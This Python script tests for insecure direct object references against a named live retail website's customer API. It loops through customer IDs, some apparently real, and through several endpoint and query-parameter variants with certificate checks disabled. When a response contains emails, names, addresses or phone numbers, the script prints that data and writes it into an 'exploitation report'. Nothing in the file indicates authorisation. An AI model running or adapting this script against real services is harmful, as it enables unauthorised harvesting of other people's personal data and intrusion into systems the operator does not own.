#!/usr/bin/env python3
"""Test IDOR in audiences API"""
import requests
import json
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_vulns = []

print("[*] Testing IDOR in audiences API...\n")

# Known customer IDs
customer_ids = [53260509, 53260633, 1, 2, 100, 999, 1000]

# Test different ways to access other users' data
test_variations = [
    "/semiprotected/api/audiences-api/v1/me",
    "/semiprotected/api/audiences-api/v1/customer/{id}",
    "/semiprotected/api/audiences-api/v1/customers/{id}",
    "/semiprotected/api/audiences-api/v1/user/{id}",
]

for customer_id in customer_ids:
    for variation in test_variations:
        endpoint = variation.replace("{id}", str(customer_id))
        try:
            resp = s.get(f"{base}{endpoint}", timeout=3, verify=False)
            if resp.status_code == 200:
                data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                if isinstance(data, dict) and data:
                    data_str = json.dumps(data)
                    # Check if we got actual user data (not empty)
                    if any(key in data_str.lower() for key in ['email', 'customer', 'name', 'address', 'phone']):
                        print(f"  [CRITICAL] IDOR: {endpoint}")
                        print(f"      Customer ID: {customer_id}")
                        print(f"      Data: {data_str[:300]}")
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": endpoint,
                            "customer_id": customer_id,
                            "data": data_str[:500]
                        })
                        break
        except: pass

# Test with query parameters
print("\n[*] Testing with query parameters...")
for customer_id in customer_ids:
    params = [
        f"/semiprotected/api/audiences-api/v1/me?customerId={customer_id}",
        f"/semiprotected/api/audiences-api/v1/me?userId={customer_id}",
        f"/semiprotected/api/audiences-api/v1/me?id={customer_id}",
        f"/semiprotected/api/audiences-api/v1/me?customer_id={customer_id}",
    ]
    for endpoint in params:
        try:
            resp = s.get(f"{base}{endpoint}", timeout=3, verify=False)
            if resp.status_code == 200:
                data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                if isinstance(data, dict) and data:
                    data_str = json.dumps(data)
                    if any(key in data_str.lower() for key in ['email', 'customer', 'name']):
                        print(f"  [CRITICAL] IDOR via parameter: {endpoint}")
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": endpoint,
                            "customer_id": customer_id,
                            "data": data_str[:500]
                        })
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} IDOR vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        print(f"    Customer ID: {v['customer_id']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 IDOR УЯЗВИМОСТИ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper()}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Customer ID:** `{v['customer_id']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated")
else:
    print("  No IDOR vulnerabilities found")

print("=" * 70)

